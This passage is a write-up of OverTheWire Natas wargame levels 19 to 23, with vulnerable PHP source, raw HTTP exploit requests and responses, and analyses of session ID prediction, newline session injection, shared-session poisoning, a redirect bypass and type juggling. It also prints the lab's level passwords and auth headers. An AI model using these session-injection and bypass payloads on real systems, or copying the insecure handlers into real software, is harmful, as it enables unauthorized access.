POST /index.php HTTP/1.1
Host: natas19.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://natas19.natas.labs.overthewire.org/
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://natas19.natas.labs.overthewire.org
Authorization: Basic bmF0YXMxOTp0bndFUjdQZGZXa3hzRzRGTldVdG9BWjlWeVpUSnFKcg==
Connection: keep-alive
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007; PHPSESSID=3238312d61646d696e
Upgrade-Insecure-Requests: 1

username=admin&password=admin
```

##### Response content:
```
HTTP/1.1 200 OK
Date: Sat, 18 Apr 2026 06:37:41 GMT
Server: Apache/2.4.58 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 1070
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas19", "pass": "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr" };</script></head>
<body>
<h1>natas19</h1>
<div id="content">
<p>
<b>
This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
</b>
</p>
You are an admin. The credentials for the next level are:<br><pre>Username: natas20
Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw</pre></div>
</body>
</html>
```

#### Result: 
```
You are an admin. The credentials for the next level are:

Username: natas20
Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
```


### Analysis
This level demonstrates a predictable session ID with encoding obfuscation.

Vulnerabilities:
- Session IDs are not random
- Sensitive information embedded in session structure (id-username)
- Encoding (hex) used instead of proper security
- Small keyspace (1–640) enables brute force

Attack Type:
- Session hijacking via predictable session IDs
- Encoding bypass (hex decoding)

Encoding (e.g., hex) is not a security mechanism. Even though session IDs are no longer sequential, they remain predictable and exploitable.

Secure session design should:
- Use cryptographically secure random values
- Avoid embedding meaningful data in session IDs
- Prevent brute-force enumeration


<br><br><br><br><br>







## Natas 20
```
URL: http://natas20.natas.labs.overthewire.org
Username: natas20
Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
```
After login, the webpage displayed a message `You are logged in as a regular user. Login as an admin to retrieve credentials for natas21`. It also provided an input field to enter a name along with a Change name button.

Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas20", "pass": "<censored>" };</script></head>
<body>
<h1>natas20</h1>
<div id="content">
<?php

function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas21\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
    }
}
/* }}} */

/* we don't need this */
function myopen($path, $name) {
    //debug("MYOPEN $path $name");
    return true;
}

/* we don't need this */
function myclose() {
    //debug("MYCLOSE");
    return true;
}

function myread($sid) {
    debug("MYREAD $sid");
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return "";
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    if(!file_exists($filename)) {
        debug("Session file doesn't exist");
        return "";
    }
    debug("Reading from ". $filename);
    $data = file_get_contents($filename);
    $_SESSION = array();
    foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
    return session_encode() ?: "";
}

function mywrite($sid, $data) {
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data");
    // make sure the sid is alnum only!!
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in ". $filename);
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
    return true;
}

/* we don't need this */
function mydestroy($sid) {
    //debug("MYDESTROY $sid");
    return true;
}
/* we don't need this */
function mygarbage($t) {
    //debug("MYGARBAGE $t");
    return true;
}

session_set_save_handler(
    "myopen",
    "myclose",
    "myread",
    "mywrite",
    "mydestroy",
    "mygarbage");
session_start();

if(array_key_exists("name", $_REQUEST)) {
    $_SESSION["name"] = $_REQUEST["name"];
    debug("Name set to " . $_REQUEST["name"]);
}

print_credentials();

$name = "";
if(array_key_exists("name", $_SESSION)) {
    $name = $_SESSION["name"];
}

?>

<form action="index.php" method="POST">
Your name: <input name="name" value="<?=$name?>"><br>
<input type="submit" value="Change name" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```


### Finding
From the source code, the application uses a custom session storage mechanism instead of the default PHP session handler.

Session data is written as:
```php
$key $value\n
```

And read using:
```php
foreach(explode("\n", $data) as $line) {
    $parts = explode(" ", $line, 2);
    $_SESSION[$parts[0]] = $parts[1];
}
```

#### Key Observation:
Each session variable is stored in a new line in the `key value` format. Besides, user input is directly stored without sanitization. This allows newline injection, leading to session manipulation


### Approach
#### Step 1: Inject New Session Entry
By injecting a newline character (%0a) into the name parameter: `name=%0aadmin 1`

##### Request Content 
```
POST /index.php HTTP/1.1
Host: natas20.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: http://natas20.natas.labs.overthewire.org
Authorization: Basic bmF0YXMyMDpwNW1DdlA3R1MySzZCbXQzZ3FoTTJGYzFBNVQ4TVZ5dw==
Connection: keep-alive
Referer: http://natas20.natas.labs.overthewire.org/index.php
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007; PHPSESSID=ul5ll7dnue22ldhdmoqqqrap4k
Upgrade-Insecure-Requests: 1

name=%0aadmin 1
```


#### Step 2: How the Session is Stored
The payload is interpreted as: `\nadmin 1`. Then, the session file becomes:
```
name 
admin 1
```


#### Step 3: Session Parsing (Second Request)
When the page is refreshed, the server reads the session file:
```
name 
admin 1
```

Parsed as:
```
$_SESSION["name"] = ""
$_SESSION["admin"] = "1"
```


#### Step 4: Gain Admin Access
Since the application checks: `if($_SESSION["admin"] == 1)`. The condition is satisfied, and admin access is granted.


#### Response Content 
```
HTTP/1.1 200 OK
Date: Sat, 18 Apr 2026 13:23:23 GMT
Server: Apache/2.4.58 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 1169
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas20", "pass": "p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw" };</script></head>
<body>
<h1>natas20</h1>
<div id="content">
You are an admin. The credentials for the next level are:<br><pre>Username: natas21
Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH</pre>
<form action="index.php" method="POST">
Your name: <input name="name" value="
admin 1"><br>
<input type="submit" value="Change name" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

**Note:** This exploit requires two requests:
- First request: Injects malicious session data into the session file
- Second request: Reloads and parses the session, activating the injected admin variable


### Analysis
This level demonstrates a Session Injection vulnerability caused by improper session handling.

Vulnerabilities:
- Custom session storage mechanism
- No input sanitization
- Use of newline (\n) as a delimiter
- User input directly affects session structure

Attack Type:
- Session poisoning / session injection
- Privilege escalation

Improper handling of session data can lead to privilege escalation. Therefore, secure implementations should:
- Use built-in session mechanisms
- Sanitize user input
- Avoid custom parsing logic for sensitive data
- Prevent injection of control characters (e.g., newline)


<br><br><br><br><br>







## Natas 21
```
URL: http://natas21.natas.labs.overthewire.org
Username: natas21
Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
```
After login, the webpage displayed a message 
```
Note: this website is colocated with http://natas21-experimenter.natas.labs.overthewire.org
You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.
```
It also provided a link to another site: `http://natas21-experimenter.natas.labs.overthewire.org/`

Navigating to the experimenter site, the page displayed:
```
Note: this website is colocated with http://natas21.natas.labs.overthewire.org

Example:
Hello world!

Change example values here:
```

It also provided input fields for `align`, `fontsize`, `bgcolor` and along with an Update button.

Source code of main site (http://natas21.natas.labs.overthewire.org):
```
 <html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas21", "pass": "<censored>" };</script></head>
<body>
<h1>natas21</h1>
<div id="content">
<p>
<b>Note: this website is colocated with <a href="http://natas21-experimenter.natas.labs.overthewire.org">http://natas21-experimenter.natas.labs.overthewire.org</a></b>
</p>

<?php

function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas22\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
    }
}
/* }}} */

session_start();
print_credentials();

?>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Source code of experimenter site (http://natas21-experimenter.natas.labs.overthewire.org/): 
```
 <html>
<head><link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css"></head>
<body>
<h1>natas21 - CSS style experimenter</h1>
<div id="content">
<p>
<b>Note: this website is colocated with <a href="http://natas21.natas.labs.overthewire.org">http://natas21.natas.labs.overthewire.org</a></b>
</p>
<?php

session_start();

// if update was submitted, store it
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}

if(array_key_exists("debug", $_GET)) {
    print "[DEBUG] Session contents:<br>";
    print_r($_SESSION);
}

// only allow these keys
$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");
$form = "";

$form .= '<form action="index.php" method="POST">';
foreach($validkeys as $key => $defval) {
    $val = $defval;
    if(array_key_exists($key, $_SESSION)) {
    $val = $_SESSION[$key];
    } else {
    $_SESSION[$key] = $val;
    }
    $form .= "$key: <input name='$key' value='$val' /><br>";
}
$form .= '<input type="submit" name="submit" value="Update" />';
$form .= '</form>';

$style = "background-color: ".$_SESSION["bgcolor"]."; text-align: ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";";
$example = "<div style='$style'>Hello world!</div>";

?>

<p>Example:</p>
<?=$example?>

<p>Change example values here:</p>
<?=$form?>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Viewing the source code revealed:

Main Site (natas21)
```
session_start();
print_credentials();
```

Experimenter Site (natas21-experimenter)
```
session_start();

if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
        $_SESSION[$key] = $val;
    }
}
```


### Finding 
Both websites are colocated, meaning they share the same session storage. From the experimenter code:
- All request parameters are directly stored into $_SESSION
- There is no restriction on what keys can be added

This means we can inject arbitrary session variables, including: `admin = 1`


### Approach 
#### Step 1: Inject Admin Session via Experimenter Site
Using Burp Suite, modify the request to include admin=1. This stores the `admin = 1` in the shared session:

##### Modified Request Content for experimental page: 
```
POST /index.php HTTP/1.1
Host: natas21-experimenter.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Origin: http://natas21-experimenter.natas.labs.overthewire.org
Authorization: Basic bmF0YXMyMTpCUGh2NjNjS0UxbGtRbDA0Y0U1Q3VGVHpYZTE1TmZpSA==
Connection: keep-alive
Referer: http://natas21-experimenter.natas.labs.overthewire.org/
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007; PHPSESSID=4aavl8sf32j33iac29ja1vra3o
Upgrade-Insecure-Requests: 1

align=center&fontsize=100%25&bgcolor=yellow&submit=Update&admin=1
```

#### Response Content for experimental page:
```
HTTP/1.1 200 OK
Date: Sun, 19 Apr 2026 04:14:38 GMT
Server: Apache/2.4.58 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 830
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head><link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css"></head>
<body>
<h1>natas21 - CSS style experimenter</h1>
<div id="content">
<p>
<b>Note: this website is colocated with <a href="http://natas21.natas.labs.overthewire.org">http://natas21.natas.labs.overthewire.org</a></b>
</p>

<p>Example:</p>
<div style='background-color: yellow; text-align: center; font-size: 100%;'>Hello world!</div>
<p>Change example values here:</p>
<form action="index.php" method="POST">align: <input name='align' value='center' /><br>fontsize: <input name='fontsize' value='100%' /><br>bgcolor: <input name='bgcolor' value='yellow' /><br><input type="submit" name="submit" value="Update" /></form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

To ensure that the $SESSION['admin'] = 1 is set, we can send request content below to verify (just navigate to ?debug instead of /index.php): 
```
POST ?debug HTTP/1.1
Host: natas21-experimenter.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Origin: http://natas21-experimenter.natas.labs.overthewire.org
Authorization: Basic bmF0YXMyMTpCUGh2NjNjS0UxbGtRbDA0Y0U1Q3VGVHpYZTE1TmZpSA==
Connection: keep-alive
Referer: http://natas21-experimenter.natas.labs.overthewire.org/
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007; PHPSESSID=4aavl8sf32j33iac29ja1vra3o
Upgrade-Insecure-Requests: 1

align=center&fontsize=100%25&bgcolor=yellow&submit=Update&admin=1
```

Response Content: 
```
HTTP/1.1 200 OK
Date: Sun, 19 Apr 2026 04:15:12 GMT
Server: Apache/2.4.58 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 994
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head><link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css"></head>
<body>
<h1>natas21 - CSS style experimenter</h1>
<div id="content">
<p>
<b>Note: this website is colocated with <a href="http://natas21.natas.labs.overthewire.org">http://natas21.natas.labs.overthewire.org</a></b>
</p>
[DEBUG] Session contents:<br>Array
(
    [debug] => 
    [align] => center
    [fontsize] => 100%
    [bgcolor] => yellow
    [submit] => Update
    [admin] => 1
)

<p>Example:</p>
<div style='background-color: yellow; text-align: center; font-size: 100%;'>Hello world!</div>
<p>Change example values here:</p>
<form action="index.php" method="POST">align: <input name='align' value='center' /><br>fontsize: <input name='fontsize' value='100%' /><br>bgcolor: <input name='bgcolor' value='yellow' /><br><input type="submit" name="submit" value="Update" /></form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

#### Step 2: Reuse the Same Session on Main Site
Send a request to the main site using the same PHPSESSID=t0csjouab0pir25qgcssqs78d2

##### Modified request header content of main site: 
```
GET / HTTP/1.1
Host: natas21.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic bmF0YXMyMTpCUGh2NjNjS0UxbGtRbDA0Y0U1Q3VGVHpYZTE1TmZpSA==
Connection: keep-alive
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007; PHPSESSID=4aavl8sf32j33iac29ja1vra3o
Upgrade-Insecure-Requests: 1
```

#### Step 3: Observe the Result
The main site checks: `if($_SESSION["admin"] == 1)`. Since the session now contains admin=1, the condition is satisfied.

##### Response content of main site: 
```
HTTP/1.1 200 OK
Date: Sun, 19 Apr 2026 04:15:58 GMT
Server: Apache/2.4.58 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 1203
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas21", "pass": "BPhv63cKE1lkQl04cE5CuFTzXe15NfiH" };</script></head>
<body>
<h1>natas21</h1>
<div id="content">
<p>
<b>Note: this website is colocated with <a href="http://natas21-experimenter.natas.labs.overthewire.org">http://natas21-experimenter.natas.labs.overthewire.org</a></b>
</p>

You are an admin. The credentials for the next level are:<br><pre>Username: natas22
Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz</pre>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

### Analysis
This level demonstrates a session poisoning vulnerability across colocated applications.

Vulnerabilities:
- Shared session storage between applications
- No validation of session keys in experimenter site
- Direct assignment of user input into $_SESSION

Attack Type:
- Session manipulation / session poisoning
- Cross-application trust abuse

Key Insight:
Even though the main application is secure by itself, the secondary application (experimenter) introduces a weakness that compromises the shared session.


<br><br><br><br><br>







## Natas 22
```
URL: http://natas22.natas.labs.overthewire.org
Username: natas22
Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz
```
After login, the webpage only got a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
```html
 <?php
session_start();

if(array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
    header("Location: /");
    }
}
?>


<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas22", "pass": "<censored>" };</script></head>
<body>
<h1>natas22</h1>
<div id="content">

<?php
    if(array_key_exists("revelio", $_GET)) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas23\n";
    print "Password: <censored></pre>";
    }
?>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

### Approach 
change the request content: 
```
GET ?revelio HTTP/1.1
Host: natas22.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic bmF0YXMyMjpkOHJ3R0JsMFhzbGczYjc2dWgzZkViU2xuT1VCbG96eg==
Connection: keep-alive
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007; PHPSESSID=uu3s3lh6jrarnv2j0o6uj7l3ll
Upgrade-Insecure-Requests: 1
```

response content: 
```
HTTP/1.1 302 Found
Date: Sun, 19 Apr 2026 04:39:06 GMT
Server: Apache/2.4.58 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /
Content-Length: 1028
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas22", "pass": "d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz" };</script></head>
<body>
<h1>natas22</h1>
<div id="content">

You are an admin. The credentials for the next level are:<br><pre>Username: natas23
Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs</pre>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

### Finding 
From the source code, the page uses a session-based check to determine whether the user is an admin. When the revelio parameter is present in the URL, the script checks if $_SESSION["admin"] == 1. If this condition is not met, the server sends a redirect response back to / using header("Location: /"). However, the important issue is that this redirect does not stop the execution of the script. There is no exit() or die() after the header call, so the PHP code continues running even after the redirect is triggered. Because of this, the second part of the code that prints the credentials is still executed whenever revelio is present in the request, regardless of whether the user is actually an admin or not.

### Analysis
This vulnerability is caused by improper access control enforcement combined with incorrect handling of HTTP redirects. Although the application checks for $_SESSION["admin"] == 1, the enforcement mechanism is flawed because it only affects navigation and does not actually block execution of sensitive logic. The use of header("Location: /") alone is not sufficient to prevent unauthorized access, since PHP continues executing the rest of the script unless explicitly terminated. As a result, the condition intended to protect the credential disclosure is effectively bypassed, allowing any user to access the output simply by supplying the revelio parameter. This demonstrates a common security mistake in web applications where developers assume a redirect equals a security barrier, when in reality proper control flow termination (such as using exit()) is required to enforce security boundaries.

<br><br><br><br><br>







## Natas 23
```
URL: http://natas23.natas.labs.overthewire.org
Username: natas23
Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs
```
After login, the webpage request password input and a login button along with view sourcecode link. 

Below is the source code content: 
```
 <html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas23", "pass": "<censored>" };</script></head>
<body>
<h1>natas23</h1>
<div id="content">

Password:
<form name="input" method="get">
    <input type="text" name="passwd" size=20>
    <input type="submit" value="Login">
</form>

<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas24 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>  
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

### Finding 
```
if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
    echo "<br>The credentials for the next level are:<br>";
    echo "<pre>Username: natas24 Password: <censored></pre>";
}
```

From the source code, the application checks the submitted passwd parameter using two conditions combined with a logical AND. The first condition uses strstr($_REQUEST["passwd"], "iloveyou"), which verifies that the input contains the substring "iloveyou". The second condition checks whether the value of $_REQUEST["passwd"] is greater than 10 using a numeric comparison. Only if both conditions are satisfied will the application display the credentials for the next level. Otherwise, it prints "Wrong!". This means the input is evaluated both as a string (for substring matching) and as a number (for comparison), which introduces a type juggling scenario in PHP.


### Approach 
use `11 iloveyou` as the input for password. 11 > 10 which satisfy the condition input > 10 and `iloveyou` is a string inside the input which satisfy the second condition. 

the browser returned: 
```
The credentials for the next level are:
Username: natas24 Password: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd
```

### Analysis
This vulnerability is caused by PHP’s weak type comparison and implicit type conversion behavior. The application assumes that the input will be treated consistently, but in reality PHP converts the input differently depending on the operation being performed. When using the greater-than operator (>), PHP attempts to interpret the input as a numeric value. This allows an input like 11 iloveyou to be evaluated as 11 for the numeric comparison, which satisfies the condition > 10. At the same time, because the string still contains the substring "iloveyou", the strstr() condition is also satisfied. As a result, both conditions return true and the authentication check is bypassed. This demonstrates a classic type juggling vulnerability, where improper handling of mixed-type input leads to unintended access control bypass.

<br><br><br><br><br>







## Natas 24
```
URL: http://natas24.natas.labs.overthewire.org
Username: natas24
Password: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd
```
After login, the webpage request password input and a login button along with view sourcecode link. 

Below is the source code content: 
```
 <html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
